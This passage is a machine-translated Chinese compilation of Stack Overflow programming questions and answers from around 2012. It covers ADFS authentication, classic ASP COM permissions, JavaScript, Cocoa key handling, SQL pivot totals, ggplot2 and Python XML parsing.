*   [https://github.com/PrimeEuler/ShellServer.js](https://github.com/PrimeEuler/ShellServer.js)

*   [https://github.com/chjj/tty.js](https://github.com/chjj/tty.js)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-06-14T08:21:01.317

[https://github.com/thlorenz/hypernal](https://github.com/thlorenz/hypernal)将终端输出呈现为 html 以简化在浏览器中重用服务器端模块。

# asp.net-mvc-3 - MVC3 和 Active Directory 联合服务

> ID：13822351
> 
> 赞同：0
> 
> 时间：2012-12-11T14:55:12.173
> 
> 标签：asp.net-mvc-3, authentication, active-directory, wif, adfs

我有一个使用 Windows 身份验证的 MVC3 应用程序，如果我们将它部署在与访问它的用户位于同一域中的服务器上，它就可以很好地工作。

我有一个请求，将应用程序部署在外部服务器（如 Amazon）上，并使用 ADFS 使用域凭据对用户进行身份验证。

有没有人有一些教程如何将此功能实现到 MVC3 应用程序中？我没有找到任何资源来帮助我解决这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T18:14:09.940

您需要查看的核心技术是 WIF（Windows Identity Foundation）。WIF SDK 有很多使用示例，我将从那里开始。

本章详细描述了这个确切的场景：

[http://msdn.microsoft.com/en-us/library/ff359102.aspx](http://msdn.microsoft.com/en-us/library/ff359102.aspx)

我建议您从同一指南的介绍部分开始，以了解“基于声明的身份”如何工作以及所涉及的组件。

对于 ADFS，我建议实验 1：

[http://claimsid.codeplex.com/releases/view/68061](http://claimsid.codeplex.com/releases/view/68061)

# windows-7 - 32 位 Windows 和 IIS 7 的 Server.CreateObject() 失败

> ID：13822353
> 
> 赞同：11
> 
> 时间：2012-12-11T14:55:25.887
> 
> 标签：windows-7, com, asp-classic, createobject

Windows 7 32 位，IIS 7.5.760016385

我在 Visual Basic 6.0 中创建了一个 DLL，并尝试在经典 ASP 代码中使用它：

```
set obj = Server.CreateObject("a.b") 
```

我收到以下错误：

> 006 ASP 0178
> Server.CreateObject 访问错误
> 检查权限时调用 Server.CreateObject 失败。拒绝访问此对象。
> err.number = -2147024891

我已尝试创建 iusr_cmpname 用户并在此 ASP 页面的默认网站和虚拟目录中为其授予权限。我有REGSVR32'd dll's。

我已经转到“打开和关闭 Windows 功能”并选择了 IIS/万维网服务/应用程序开发功能，然后检查了 ASP、ASP.net、ISAPI 扩展和 ISAPI 文件管理器。

我在不同的新闻组中跟踪了许多线索，但我可以克服这个问题。去年，一年零 1/2 年前，我们尝试过这个，并且遇到了同样的问题。由于我们无法克服这个问题，我们又回到了 Windows NT。我们在 NT 上从来没有遇到过这个问题。

现在我们再次尝试克服这个问题，以便我们可以再次迁移到 Windows 7。似乎很多人都遇到了这个问题，但是他们找到并发布的任何解决方案似乎都不是我需要的。

任何帮助将不胜感激。谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-26T00:47:36.280

该问题似乎与 IIS 无法访问文件系统上的自定义 VB6 Active X dll 有关。我在与默认 Web 应用程序相同的目录中注册了一个我创建的自定义 dll，并且能够让 ASP 来创建对象。

这是我所做的：

*   全新安装 Windows 7 Professional 64 位，SP1。

*   启用 Windows ASP 功能

*   此步骤仅适用于 64 位 Windows - 使用 IIS 管理器，为默认应用程序池启用 32 位应用程序。

![启用 32 位应用程序池](../Images/fce67a27f0d0590660a18ebbc94b75a9.png)

*   创建一个简单的 VB6 Active X dll（类名为“CXUtils.Utils”），将两个输入数字相加并返回结果。

实用程序.cls：

```
Public Function Sum(ByVal a As Integer, ByVal b As Integer) As Integer     
    Sum = a + b
End Function 
```

*   这是重要的一步 - 在管理命令提示符下，在默认 Web 应用程序位置注册 Vb6 Active X dll：C:\inetpub\wwwroot

![注册自定义 VB6 DLL](../Images/717ebbc394f4a9add3030b53a30d1e3c.png)

*   创建并安装一个简单的 asp 页面，从上面实例化 dll。安装位置是默认的 Web 应用程序位置 C:\inetpub\wwwroot

默认.asp：

```
<%@ Language=VBScript %>
<%
Option Explicit
Response.Expires = 0
Response.Expiresabsolute = Now() - 1 
Response.AddHeader "pragma","no-cache" 
Response.AddHeader "cache-control","private" 
Response.CacheControl = "no-cache" 

Function Sum(a, b)
    Sum = a + b
End Function

Function Sum2(a, b)
    Dim adder
    set adder = Server.CreateObject("CXUtils.Utils")
    Sum2 = adder.Sum(a, b)
    set adder = nothing
End Function
%>
<html>
    <head>
        <title>Add</title>
    </head>
    <body>
    <b>2 + 3</b> = <%= Sum(2,3) %><br />
    <b>3 + 4</b> = <%= Sum2(3,4) %>
    </body>
</html> 
```

*   浏览到 Web 应用程序并查看结果

![示例 asp 页面结果](../Images/ac5af1162203e11c8ad7a2d896ca0424.png)

如果这不能全部编译，我深表歉意 - 进行了大量编辑以使格式正确显示。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-19T21:19:29.717

我强烈建议使用[Procmon](http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx)来查找访问冲突。几年前我有一个类似的问题，这是唯一解决它的方法。在那种情况下，结果是系统临时文件夹缺少权限。

如果您发布 Procmon 的结果，我可能会修改此答案以提供更多帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-19T21:15:47.007

此页面表明问题可能是分配给 VB 运行时的访问权限。尝试为每个人分配 Msvbvm60.dll 的读取和执行权限。

[http://support.microsoft.com/kb/278013](http://support.microsoft.com/kb/278013)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-11T21:34:04.807

我想我遇到了类似的问题。我试图从经典的 ASP 应用程序在 VB6 IDE 中运行的 VB6 DLL 中交互式调试代码。当应用程序执行 Server.CreateObject 语句时，它返回以下错误：

服务器对象：006~ASP 0178~Server.CreateObject 访问错误~在检查权限时调用 Server.CreateObject 失败。拒绝访问此对象。

顺便说一句，我在 Windows 7 环境中运行 IIS 7.5。我终于找到了一篇 Microsoft 文章，说问题是由于 DCOM 中缺少 VB ASP 调试的注册表项和/或 DCOM 权限不足，而不是 IIS。文章的 URL 是[http://support.microsoft.com/kb/q259725](http://support.microsoft.com/kb/q259725)。我实施了围绕 #1 的工作。一次重新启动后，我可以从 ASP 进入 VB DLL 代码。为微软加油，我不经常这么说:-)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-08-10T16:52:23.613

另一种可行的方法是将 DLL 作为 DCOM 应用程序安装在 dcomcnfg 上。它将在不同的凭据下运行。

# android - 保护 WPF Web 服务仅用于 Android 应用程序使用

> ID：13822354
> 
> 赞同：1
> 
> 时间：2012-12-11T14:55:31.260
> 
> 标签：android, wpf, web-services

因此，我计划构建一个 Android 应用程序将连接到的 Web 服务。我试图想出一种方法来保护这个网络服务，所以它只能通过应用程序使用。

我在想只是在我拨打的每个电话中传递一个密钥。但这很容易被 http 嗅探器破坏。届时，任何人都可以使用 Web 服务。

还有其他方法可以使这项工作吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T16:56:09.087

我不知道你只能 FORCE Android。如果他们知道它是什么，您使用的任何方法都可以解决。

根据应用程序的编写方式，检查请求的用户代理应该足够简单。使用 HttpUrlConnection（由 Android 文档推荐）的应用程序应该有一个用户代理字符串，其中包含 Android。

# javascript - 在多层 Javascript 中处理事件

> ID：13822355
> 
> 赞同：0
> 
> 时间：2012-12-11T14:55:34.863
> 
> 标签：javascript, html

我使用 3 层来绘制图形：2 层画布和 1 层 SVG。1 个画布将实时渲染以更新图形，我想处理 SVG 层中的鼠标事件。但我无法捕捉到任何鼠标事件，因为画布捕捉到了所有事件。我试图为 2 canvas 和 svg 设置 z-index 。但它没有用。有谁知道这样做的方法？

# objective-c - 箭头和 CMD 的修饰符标志

> ID：13822359
> 
> 赞同：1
> 
> 时间：2012-12-11T14:55:53.340
> 
> 标签：objective-c, cocoa

我正在构建一个 Cocoa 键盘管理器，但我不明白如何正确拦截涉及箭头的标志组合。

例如，我可以拦截开关中的每个标志组合：

```
NSUInteger flags = [theEvent modifierFlags] & NSDeviceIndependentModifierFlagsMask;

switch(flags){ 
    case: NSCommandKeyMask
         //Command pressed
    break;

    case NSCommandKeyMask|NSControlKeyMask
         //Command + Control
    break;
} 
```

但我不知道如何拦截与箭头的组合！我知道箭头`NSNumericPadKeyMask`用作掩码......但是如果写这样的案例，什么也不会发生：

```
 case: NSCommandKeyMask|NSNumericPadKeyMask
         //Command + arrow ... It doesn't work! 
         int keycode = ... 
    break; 
```

我该如何处理这个问题并用箭头截取组合？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T22:22:47.517

箭头不是修饰符——您会在`[theEvent keyCode]`.

换句话说，当您收到一个键事件，并且`keyCode`指示它是箭头键之一时，您可以查看`modifierFlags`以查看在按下箭头键时按住了哪些修饰符。

这是一个例子：

```
#define keyModifierMask (NSShiftKeyMask|NSControlKeyMask|NSAlternateKeyMask|NSCommandKeyMask)

- (void)keyDown:(NSEvent *)theEvent {
    NSString *chars = [theEvent characters];
    unichar aChar = [chars characterAtIndex: 0];
    if (aChar == NSUpArrowFunctionKey
        || aChar == NSDownArrowFunctionKey
        || aChar == NSLeftArrowFunctionKey
        || aChar == NSRightArrowFunctionKey) {
        NSLog(@"arrow modifiers: %lx",([theEvent modifierFlags]&keyModifierMask));
    }
    [super keyDown: theEvent];
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:59:09.580

不知道这算不算BUG。要拦截 CMD+箭头，我必须使用以下组合：

```
case (NSCommandKeyMask|NSFunctionKeyMask|NSNumericPadKeyMask): 
```

文档说箭头产生 a `NSNumericPadKeyMask`，但没有说明`NSFunctionKeyMask`.

# javascript - 创建 JavaScript 选择器的问题

> ID：13822364
> 
> 赞同：0
> 
> 时间：2012-12-11T14:56:11.267
> 
> 标签：javascript, javascript-framework

我在创建我的选择器时遇到了一个问题，我确实需要像在每个 Set Chain 中的 jquery 中一样使用它

```
var Ary = []; 
var Selector = function(selectorFormant){
// Some Script using querySelectorAll and pushing Elements to Ary
return Ary;
}

Ary.getByTypes=function(typesString){
//Some Script here take the elements inside the Ary and get the elements inside them with the specific types typesString and repush new elements in the Ary
return Ary;
}

        Selector.prototype = Ary;
        Selector.prototype.constructor = Selector;
//this script is responsible for inheritance from Ary to Selector Class 
```

我在这里的问题是开发人员可以通过两种方式使用选择器类

1- Selector.getByTypes('types') 或

2- Selector('selector format like jquery').getByTypes('types')

在 2 中，我不必实例化一个对象来应用我执行的继承，因为方法 Selector 返回具有函数 getByTypes 的 Ary

但是在 1 中，当我不需要开发人员编写新关键字时，我必须从 Selector 实例化一个对象以应用继承来为我拥有 Ary 成员

2 我不需要那个 - new Selector('selector format').getByTypes('types');

任何人都可以帮忙:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T16:09:20.010

看来您真正想要的是：

```
function Selector(sel) {
    // check if the constructor was used with "new". If not, correct that:
    if (! (this instanceof Selector)) return new Selector(sel);

    // Notice that "this" is an empty object, inheriting from the prototype.
    var els = document.querySelectorAll(sel);
    for (var i=0; i<els.length; i++)
        this.push(els[i]); // use the inherited method "push"
    // even though this is not an actual Array instance

    // Don't return anything, there's an implizit "return this;" as we used "new"
}

// Let the prototype object inherit from Array.prototype
Selector.prototype = Object.create(Array.prototype, {
    constructor: {value:Selector, configurable:true} // and (re)sest constructor
});

// define "getByTypes" method for all instances:
Selector.prototype.getByTypes = function(typ) {
     // Do something with "this"
     …
     // and for chainability return a Selector instance, either a new one or just
     return this;
}; 
```

如果你真的需要`Selector.getByTypes()`——比如“[类方法](https://stackoverflow.com/q/13823119/1048572)”——你可以在那个属性上添加一个（完全不相关的）函数，做你想做的事：

```
Selector.getByTypes = function(typ) {
    return new Selector("*").getByTypes(typ); // or anything else
}; 
```

…但是，如果在选定的元素中进行搜索，`Selector("button")`我觉得写作似乎更容易。`getByTypes`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:19:05.777

querySelectorAll 方法怎么样（虽然只有较新的浏览器支持）？

[https://developer.mozilla.org/en-US/docs/DOM/document.querySelectorAll](https://developer.mozilla.org/en-US/docs/DOM/document.querySelectorAll)

# javascript - Javascript 函数每 2 分钟运行一次，无需加载另一个页面

> ID：13822365
> 
> 赞同：0
> 
> 时间：2012-12-11T14:56:11.250
> 
> 标签：javascript, geolocation

嗨，我对 javascript 很陌生，我有一小段 javascript，它可以获取使用地理定位的纬度和经度，然后将其传递给 php 页面。

我想要做的是每两分钟运行一次函数，但每次函数运行时都会加载 test.php 页面

我的代码在下面

```
 function position(){
  var a=setTimeout(position(),60000)
  }

    if(navigator.geolocation)
      {
      navigator.geolocation.getCurrentPosition(function(position)
      {
      var lat = position.coords.latitude;
      var lon = position.coords.longitude;
      document.location = "locator/test1.php?lat=" + lat + "&lon=" + 
                   lon;

      });
  } 
```

是否可以在不加载的情况下将变量传递给 php 页面？或者调用 javascript 函数以每两分钟更新一次详细信息的最佳方法是什么。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:58:40.307

首先，您在上面的代码中有一个错误，可能是一个错字。

```
var a=setTimeout(position(),60000)  <-- calling the function, not assigning it. 
```

它应该是

```
var a=setTimeout(position,60000); 
```

现在回答你的问题：

对服务器进行 Ajax 调用。

```
var xmlHttp = new XMLHttpRequest();  //not the cross browser way of doing it
xmlHttp.open("GET", "locator/test1.php?lat=" + lat + "&lon=" + lon, true); 
xmlHttp.send(null); 
```

# c++ - boost协程在Windows x86_64上不起作用吗？

> ID：13822368
> 
> 赞同：0
> 
> 时间：2012-12-11T14:56:16.687
> 
> 标签：c++, boost, boost-coroutine

我编译了`parallel.cpp`附带`boost::coroutines::coroutine`32 位和 64 位程序的示例。

他们都编译和链接没有错误。32 位程序运行并按预期运行，但 64 位应用程序在启动时崩溃。

在 64 位 Windows 7 上使用 Visual Studio 2012 Express。

***编辑：***协程已被接受为 boost 但尚未作为 boost 分发的一部分发布。我使用了作者“最终”版本中的示例。

***编辑***：这是代码

```
#include <boost/bind.hpp>
#include <boost/coroutine/all.hpp>

typedef boost::coroutines::coroutine< void() > coroutine_t;

void first( coroutine_t::caller_type & self)
{
    std::cout << "started first! ";
    for ( int i = 0; i < 10; ++i)
    {
        self();
        std::cout << "a" << i;
    }
}

void second( coroutine_t::caller_type & self)
{
    std::cout << "started second! ";
    for ( int i = 0; i < 10; ++i)
    {
        self();
        std::cout << "b" << i;
    }
}

int main( int argc, char * argv[])
{
    {
        coroutine_t c1( boost::bind( first, _1) );
        coroutine_t c2( boost::bind( second, _1) );
        while ( c1 && c2) {
            c1();
            std::cout << " ";
            c2();
            std::cout << " ";
        }
    }

    std::cout << "\nDone" << std::endl;

    return EXIT_SUCCESS;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T13:31:15.540

使用 boost-trunk 的最新版本 - 包含 boost.coroutine + boost.context 的最新版本（由 boost.coroutine 用于上下文交换）尝试首先构建单元测试（/libs/coroutine/test）

# javascript - 如何使用jQuery附加一个元素，它的所有子元素，以及父子元素的所有类

> ID：13822370
> 
> 赞同：1
> 
> 时间：2012-12-11T14:56:22.843
> 
> 标签：javascript, jquery

我有一个成功删除元素并将其附加到页面其他位置的功能。问题是，一旦文档准备好，jQuery 就会向在移动时丢失的子项添加类和属性。我需要这些类和属性在删除和附加后保留。我曾考虑调用添加类的原始函数，但问题是它们是基于键的，并且依赖于它们在移动之前的位置，在更改键后调用它，因此将添加全新的和不同的类。

添加 jQuery 的类非常标准：

```
$(function(){
    $("div").each(function(key){
        if ($(this).hasClass("container")){
            $(this).find("ul").addClass("parent" + key);
            $(this).find(".container-item").attr("parentClass", ".parent" + key);
        };
    });
}); 
```

删除/追加功能：

```
function copy_item(draggable, target){
    var account = clone_items(draggable);
    //$('#'+name.uid).remove();
    $('#'+name.uid).hide();
    target.append(make_div(name, true, true));
    //$(draggable).children().attr("class", ($(draggable).children().attr("class")));
}
function make_div(name, drag, drop){
    var newdiv = document.createElement('div');
    newdiv.setAttribute('id', name.uid);
    newdiv.appendChild(make_h3(name.username));
    ul = document.createElement('ul');
    ul.setAttribute("class", "domain_list");
    newdiv.appendChild(ul);
    for (j = 0; j < name.domains.length; ++j) { 
        ul.appendChild(make_li(name.domains[j], drag));
    }
    return newdiv;
} 
```

HTML 中的最终结果基本上是：

```
<div class="container">
    <ul class="parent0">
        <li parentClass="parent0">
        <li parentClass="parent0"> 
```

重新创建此结构时，我需要保持类“parent0”和 parentClass 属性不变。在上面你可以看到我已经尝试隐藏元素，确保它仍然是具有正确类/属性的有效元素，但最终仍然没有成功。理想情况下，我可以完全删除元素并使用正确的类重新创建它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:09:32.627

如果我对您正在尝试做的事情的理解是正确的，那么您不需要`.remove()`重新创建元素来*移动*它。你可以这样做：

```
function copy_item(draggable, target) {
    // not sure what this variable is for 
    // as you don't seem to be using it?
    var account = clone_items(draggable);

    // ...however, appending an existing 
    // element to another will 'move' it
    // and preserve all of it's properties
    target.append($('#' + name.uid));
} 
```

# ruby - 在 Rails 上使用 3d 派对网站设置用户登录和管理的好方法？

> ID：13822373
> 
> 赞同：1
> 
> 时间：2012-12-11T14:56:30.540
> 
> 标签：ruby, ruby-on-rails-3

我需要在 Rails 中设置简单的用户帐户相关逻辑。

现在我只有一个带有 API 的 3d 方站点，它返回所有需要的用户数据——所以 Devise 看起来像是一个巨大的开销。登录场景为：

```
user -> myApp -> centralApp 
```

如果提供的信息是正确的，我会得到一个带有数据的对象并允许用户执行需要身份验证的操作。

问题是，这应该如何组织？我想得到类似`User.logged_in?`and的东西`User.login!(username, password)`。但不是库或模型不能使用会话来存储数据。如果没有会话，很难想象如何在请求之间存储每个用户的信息。

选项是存储数据并从控制器（ApplicationController？）加载数据，但是将相关代码散布在这里和那里看起来有点脏。

# javascript - .length 递增和递减

> ID：13822376
> 
> 赞同：-1
> 
> 时间：2012-12-11T14:56:46.883
> 
> 标签：javascript, count

这是我在javascript中的代码：

```
function length(inputLength){
    this.inputLength = inputLength;
    document.getElementById('view').innerHTML = inputLength.length;
} 
```

通常，当我按下一个键时，计数器会递增，而当我使用退格键删除一个字符时，计数器会递减。问题是当我删除一个字符时，计数也会增加 1，然后正常减少。使用“onkeydown”事件尝试此代码。

你能帮助我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:02:33.030

为什么不简化它并这样做：

```
​function calcLength(elem) {
    document.getElementById('output').innerHTML = elem.value.length;
} 
```

输入在哪里`elem`。使用`elem.value.length`将获取输入中内容的长度。

HTML的一个例子是这个

```
​&lt;input id="testing" value="" onkeyup="calcLength(this)" />
Length = <span id="output"></span>​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 
```

[这里的工作示例](http://jsfiddle.net/dCq4e/)

# visual-studio-2010 - VC++ 2010 中最大的可分配数组

> ID：13822378
> 
> 赞同：0
> 
> 时间：2012-12-11T14:56:47.780
> 
> 标签：visual-studio-2010, visual-c++

有谁可以在 Visual C++ 2010 中分配的最大数组是多少？我的意思是元素的最大数量。我可以做类似 int tarray [unsigned long] 的事情，其中​​ unsigned long 是一些大于 32 位整数的无符号数吗？

# spring - 似乎无法让 JNDI JDBC 资源在 Liferay 中工作

> ID：13822379
> 
> 赞同：0
> 
> 时间：2012-12-11T14:56:51.003
> 
> 标签：spring, jdbc, liferay, jndi

Liferay 论坛上没有关于这个问题的快乐，这个项目的时钟正在滴答作响。这可能是由于我对Spring的了解不足造成的。

我在 server.xml 中定义了一个 JNDI 全局资源，在我的 Tomcat 7 /conf 文件夹中的 context.xml 中有一个资源链接。我知道正在加载 JNDI 资源，因为我看到验证查询在服务器启动时正在运行。到目前为止，一切都很好。

我有一个只为其他 portlet 提供服务的 portlet。在那个 portlet 中，我有一个 hibernate.cfg.xml，它有一个会话工厂，它也指向 JDBC 资源（不知道这是否需要）。我在服务 portlet 中还有一个 ext-spring.xml 文件，它具有以下内容：

```
<bean id="liferayHibernateSessionFactory" class="com.liferay.portal.spring.hibernate.PortletHibernateConfiguration" >
<property name="dataSource" ref="MyJDBCResource" />
</bean>

<bean id="MyJDBCResource" class="org.springframework.jndi.JndiObjectFactoryBean" >
<property name="jndiName" value="java:comp/env/jdbc/MyJDBCResource" />
</bean> 
```

在 ext-spring.xml 中添加上述内容修复了部署时该服务 portlet 上出现 bean 错误的问题。在该服务构建器构建的 portlet 中，创建了一个服务 jar，我将该服务 jar 放在 Tomcat_Home/lib/ext 文件夹中，以便我可以在我的 portlet 中使用该 portlet 提供的服务。到目前为止，一切都很好。但是，当我使用 JNDI 引用调用另一个 portlet 提供的服务的 portlet 方法时，我收到“用户缺少特权或找不到对象”错误。*肯定*是找不到对象。运行查询时，我看到 JNDI 资源条目指定的 JDBC 连接上绝对没有活动，并且在深入研究连接属性时，我只看到正在使用的 HSQLDB 驱动程序。它*应该*据我了解，正在使用我的全局资源 JNDI 条目中指定的 MSSQL 驱动程序。

那么我做错了什么？我是否需要在*调用*服务的 portlet 中添加一些配置条目？

这看起来很简单。在阅读许多提供有关使用 JNDI/JDBC 资源的说明的帖子时，我似乎正确地遵循了它们。我错过了在 LR 6.1.1 和 Tomcat 7 中使用 JNDI/JDBC 资源的技巧吗？

谢谢（真的希望得到一些答案！）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T12:46:52.473

首先，您可以尝试像这样重写 JNDI 资源引用：

```
<bean id="MyJDBCResource" class="org.springframework.jndi.JndiObjectFactoryBean" >
  <property name="jndiName" value="jdbc/MyJDBCResource" />
</bean> 
```

此外，您可以在 Spring 中尝试不同的 JNDI 资源查找方法：

```
<jee:jndi-lookup id="MyJDBCResource" jndi-name="jdbc/MyJDBCResource" expected-type="javax.sql.DataSource" /> 
```

不确定第一个方法，但如果找不到 JNDI 资源，第二个肯定会提前失败。希望这可以帮助。

# sql-server - 在数据透视表中添加总计

> ID：13822381
> 
> 赞同：1
> 
> 时间：2012-12-11T14:56:23.487
> 
> 标签：sql-server, tsql, pivot, dynamic-sql

我使用以下代码创建了一个数据透视表：

```
DECLARE @SQL AS VARCHAR(MAX)
DECLARE @Columns AS VARCHAR (MAX)

SELECT @Columns =
COALESCE(@Columns + ', ','')+ QUOTENAME(PortfolioID)
FROM
(
SELECT PortfolioID FROM InfoPortal.DBO.fn_Generic_PortfolioGroupMembers (@PortfolioGroup)
) AS B
ORDER BY B.PortfolioID

SET @SQL = '
WITH PivotData AS
(
    SELECT 
        PortfolioID, Percentage, DurationBand, DurationSort 
    FROM #Worktable
)

SELECT 
    DurationBand, 
    ' + @Columns + '
FROM PivotData
PIVOT
(
    SUM(Percentage)
    FOR PortfolioID
    IN (' + @Columns + ')
) AS PivotResult
ORDER BY DurationSort'

EXEC (@SQL) 
```

但是，我想做的是为每个投资组合 ID 添加总计，我不确定如何实现这一点。有什么帮助吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:16:13.980

您应该能够添加 a`GROUP BY with ROLLUP`来生成总计行，类似于：

```
DECLARE @SQL AS VARCHAR(MAX)
DECLARE @Columns AS VARCHAR (MAX)
DECLARE @ColumnsRollup AS VARCHAR (MAX)

SELECT @Columns =
COALESCE(@Columns + ', ','')+ QUOTENAME(PortfolioID)
FROM
(
    SELECT distinct PortfolioID 
    FROM worktable
) AS B
ORDER BY B.PortfolioID

SELECT @ColumnsRollup =
COALESCE(@ColumnsRollup + ', Sum(','Sum(')+ QUOTENAME(cast(PortfolioID as varchar(10)))+') as Portfolio'+cast(PortfolioID as varchar(10))
FROM
(
    SELECT distinct PortfolioID 
    FROM worktable
) AS B
ORDER BY B.PortfolioID

SET @SQL = '
            WITH PivotData AS
            (
                SELECT PortfolioID, Percentage, DurationBand, DurationSort 
                FROM Worktable
            )
            SELECT case when DurationBand is not null then cast(durationband as varchar(10))
                else ''Total'' end Durationband, ' + @ColumnsRollup+ '
            FROM
            (
                SELECT DurationBand, ' + @Columns + '
                FROM PivotData
                PIVOT
                (
                    SUM(Percentage)
                    FOR PortfolioID IN (' + @Columns + ')
                ) AS PivotResult
            ) src
            GROUP BY DurationBand with ROLLUP'

EXEC (@SQL) 
```

请参阅[SQL Fiddle with Demo](http://sqlfiddle.com/#!3/bba34/18)。 *注意：示例数据只是根据您的表结构进行模拟的。*

结果：

```
| DURATIONBAND | PORTFOLIO1 | PORTFOLIO2 | PORTFOLIO3 |
-------------------------------------------------------
|            2 |         78 |     (null) |     (null) |
|            5 |     (null) |     (null) |          4 |
|           12 |         10 |         45 |     (null) |
|        Total |         88 |         45 |          4 | 
```

根据需要对事物进行分类，您可以使用：

```
DECLARE @SQL AS VARCHAR(MAX)
DECLARE @Columns AS VARCHAR (MAX)
DECLARE @ColumnsRollup AS VARCHAR (MAX)

SELECT @Columns =
COALESCE(@Columns + ', ','')+ QUOTENAME(PortfolioID)
FROM
(
    SELECT distinct PortfolioID 
    FROM worktable
) AS B
ORDER BY B.PortfolioID

SELECT @ColumnsRollup =
COALESCE(@ColumnsRollup + ', Sum(','Sum(')+ QUOTENAME(cast(PortfolioID as varchar(10)))+') as '+QUOTENAME(cast(PortfolioID as varchar(10)))
FROM
(
    SELECT distinct PortfolioID 
    FROM worktable
) AS B
ORDER BY B.PortfolioID

SET @SQL = '
            WITH PivotData AS
            (
                SELECT PortfolioID, Percentage, DurationBand, DurationSort 
                FROM Worktable
            )
            SELECT *
            FROM
            (
                SELECT DurationBand, ' + @Columns + '
                FROM PivotData
                PIVOT
                (
                    SUM(Percentage)
                    FOR PortfolioID IN (' + @Columns + ')
                ) AS PivotResult
                UNION ALL
                select ''Grand Total'', '+@ColumnsRollup+'
                from
                (
                    SELECT DurationBand, ' + @Columns + '
                    FROM PivotData
                    PIVOT
                    (
                        SUM(Percentage)
                        FOR PortfolioID IN (' + @Columns + ')
                    ) AS PivotResult
                )tot
            ) src
            '

EXEC (@SQL) 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/2d9cb/2)

# r - 暂时禁用 ggplot() 中已经定义的美学

> ID：13822385
> 
> 赞同：4
> 
> 时间：2012-12-11T14:57:12.237
> 
> 标签：r, ggplot2, aesthetics

我们可能想`aes()`为`ggplot()`图形定义一些全局，但在某些层中排除它们。例如假设以下示例：

```
foo <- data.frame(x=runif(10),y=runif(10))
bar <- data.frame(x=c(0,1),ymin=c(-.1,.9),ymax=c(.1,1.1))
p <- ggplot(foo,aes(x=x,y=y))+geom_point() 
```

一切都是好的。但是，当尝试添加功能区时：

```
p <- p + geom_ribbon(data=bar, aes(x=x,ymin=ymin,ymax=ymax), alpha=.1)
# Error: Discrete value supplied to continuous scale 
```

发生此错误是因为我们已经将其定义`y`为 global 的一部分，`aes()`它也适用于`geom_ribbon()`，但`bar`没有它。

我发现了两种可能来逃避这个错误，其中一种是`y=y`从原来的中删除`ggplot(foo,aes(x=x,y=y))`，但是以后每次我都需要画一些我应该添加`y=y`到`aes()`不好的东西。

另一种可能性是将假`y`列添加到`bar`：

```
bar = cbind(bar, y=0)
p <- p + geom_ribbon(data=bar, aes(x=x,ymin=ymin,ymax=ymax), alpha=.1) 
```

![在此处输入图像描述](../Images/2ab75177dd3233d89e4efe318ed68418.png)

现在效果很好。但是我不喜欢这样做，因为它是一个假变量。有没有办法`aes()`在`ggplot()`调用时暂时禁用已经定义的`geom_ribbon()`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:53:26.447

正如@ErnestA 在评论中所说，我们可以通过将美学设置为 NULL 来取消映射美学

```
 aes(y=NULL,x=x,ymin=ymin,ymax=ymax) 
```

PS：对于传说，您现在可以通过以下方式覆盖审美`aes.override`

# python - 标签有多个重复时如何从每个xml标签中获取文本

> ID：13822386
> 
> 赞同：0
> 
> 时间：2012-12-11T14:57:11.400
> 
> 标签：python, xml, dictionary, for-loop

抱歉，如果问题晦涩难懂，但此示例 xml 完全说明了这一点。

```
<Components>
    <Component>
        <ComponentID>B1</ComponentID>
        <ComponentName>replace</ComponentName>
        <Description>replace</Description>
    </Component>
    <Component>
        <ComponentID>D2</ComponentID>
        <ComponentName>Red</ComponentName>
        <Description>Red</Description>
    </Component>
    <Component>
        <ComponentID>D3</ComponentID>
        <ComponentName>Yellow</ComponentName>
        <Description>Yellow</Description>
    </Component>
</Components> 
```

本质上，我想将这些组件中的每一个保存到字典中。我试过这段代码：

```
if elem1.tag == 'Components':
    for elem2 in list(elem1):
        if elem2.tag == 'Component':
            temp = 0
            for elem3 in list(elem2):
                if elem3.tag == 'ComponentID':
                    temp+=1
                    asset['CompID'+str(temp)] = elem3.text
            for elem3 in list(elem2):
                if elem3.tag == 'ComponentName':
                    temp+=1
                    asset['CompName'+str(temp)] = elem3.text
            for elem3 in list(elem2):
                if elem3.tag == 'Description':
                    temp+=1
                    asset['Description'+str(temp)] = elem3.text 
```

但是发生的问题是，即使每个字典键都是唯一的，它仍然只是最后找到的组件才能获得信息。

电流输出：

```
{'CompID1': 'D3', 'CompName2': 'Yellow', 'Description3': 'Yellow'} 
```

期望的输出：

```
{'CompID1': 'B1', 'CompName1': 'replace', 'Description1': 'replace',
'CompID2': 'D2', 'CompName2': 'Red', 'Description2': 'Red',
'CompID3': 'D3', 'CompName3': 'Yellow', 'Description3': 'Yellow'} 
```

我知道我的临时调用和分配可能是错误的，但主要问题是在每个标签中分配文本值，因为它只找到最后一个。最终的解决方案最终需要字典以用于其他方法和功能。因此，尽管欢迎任何提示和解决方案，但如果它们可以专注于字典，那将非常有帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:04:08.150

尝试改变它：

```
if elem1.tag == 'Components':
    temp = 0
    for elem2 in list(elem1):
        if elem2.tag == 'Component':
            for elem3 in list(elem2):
